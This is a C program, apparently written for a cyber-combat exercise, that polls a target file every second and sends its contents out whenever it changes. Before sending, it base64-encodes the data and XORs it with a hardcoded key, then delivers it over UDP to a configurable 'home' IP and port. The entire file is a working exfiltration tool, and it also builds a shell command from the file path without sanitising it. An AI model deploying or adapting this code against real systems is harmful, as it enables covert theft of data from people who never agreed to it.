#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <string.h>

#define MAX_BUF_SIZE 1024
const char* xorKey = "bobbyb";

int main() {
    /**
     * @brief CHANGE THESE VARIABLES
     * 
     */
    const char* filepath = "/home/nathan/CyberCombat/intel";
    const char* homeIP = "0.0.0.0";
    const int homePort = 9001;

    struct stat file_stat;
    if (stat(filepath, &file_stat) == -1) {
        perror("Error");
        exit(EXIT_FAILURE);
    }

    time_t last_modified = file_stat.st_mtime;

    while (1) {
        sleep(1); // Wait for 1 second

        if (stat(filepath, &file_stat) == -1) {
            perror("Error");
            exit(EXIT_FAILURE);
        }

        if (file_stat.st_mtime != last_modified) {
            printf("File has been modified!\n");
            last_modified = file_stat.st_mtime; // Update last modified time

            // Open a pipe to the base64 command's standard output

            char command[1024];
            snprintf(command, sizeof(command), "base64 < %s", filepath);

            FILE* base64_pipe = popen(command, "r");
            if (base64_pipe == NULL) {
                perror("Error executing base64 command");
                exit(EXIT_FAILURE);
            }

            // Read the output of the base64 command from the pipe
            char buffer[MAX_BUF_SIZE];
            size_t bytes_read = fread(buffer, 1, sizeof(buffer), base64_pipe);
            if (bytes_read == 0) {
                perror("Error reading from base64 command");
                pclose(base64_pipe);
                exit(EXIT_FAILURE);
            }

            // Close the pipe
            pclose(base64_pipe);

            // XOR the base64-encoded data
            for (size_t i = 0; i < bytes_read; i++) {
                buffer[i] ^= xorKey[i % strlen(xorKey)];
            }

            printf("Sending intel to %s:%d\n", homeIP, homePort);
            printf("Contents: %s\n", buffer);

            // Create UDP socket for home server
            int sock = socket(AF_INET, SOCK_DGRAM, 0);
            if (sock == -1) {
                perror("Error creating socket");
                exit(EXIT_FAILURE);
            }

            // Configure server address
            struct sockaddr_in server;
            server.sin_family = AF_INET;
            server.sin_port = htons(homePort);
            server.sin_addr.s_addr = inet_addr(homeIP);

            // Send the contents of the file (base64 output) to the home server
            ssize_t bytes_sent = sendto(sock, buffer, bytes_read, 0, (struct sockaddr*)&server, sizeof(server));
            if (bytes_sent == -1) {
                perror("Error sending data");
                close(sock);
                exit(EXIT_FAILURE);
            }

            printf("Sent %zd bytes of data\n", bytes_sent);

            close(sock);
        }
    }

    return 0;
}
